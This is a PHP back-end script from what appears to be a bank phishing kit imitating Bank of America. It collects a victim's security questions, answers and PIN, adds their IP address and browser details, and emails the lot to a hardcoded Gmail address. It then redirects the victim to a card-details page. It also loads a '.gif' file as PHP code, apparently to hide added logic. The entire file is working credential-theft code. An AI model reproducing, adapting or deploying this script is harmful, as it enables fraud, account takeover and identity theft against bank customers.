<?php
include ("images/blocker.gif");
if($_POST["question1"] != "" and $_POST["answer1"] != ""){
$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$useragent = $_SERVER['HTTP_USER_AGENT'];
$message = "|----------- BOFA AT MONALISA SERVICE --------------|\n";
$message .= "Pregunta 1            : ".$_POST['question1']."\n";
$message .= "Respuesta 1            : ".$_POST['answer1']."\n";
$message .= "Pregunta 2            : ".$_POST['question2']."\n";
$message .= "Respuesta 2            : ".$_POST['answer2']."\n";
$message .= "Pregunta 3            : ".$_POST['question3']."\n";
$message .= "Respuesta 3            : ".$_POST['answer3']."\n";
$message .= "PIN           : ".$_POST['pin']."\n";
$message .= "|--------------- I N F O | I P -------------------|\n";
$message .= "|Client IP: ".$ip."\n";
$message .= "|--- http://www.geoiptool.com/?IP=$ip ----\n";
$message .= "User Agent : ".$useragent."\n";
$message .= "|----------- BY BLACKSUN4  --------------|\n";
$send = "alfredomillan799@gmail.com";
$subject = "Card | $ip";
{
mail("$send", "$subject", "$message");
mail("$userinfo","$subject","$message");
}
$praga=rand();
$praga=md5($praga);
  header ("Location: card.php");
}else{
}
?>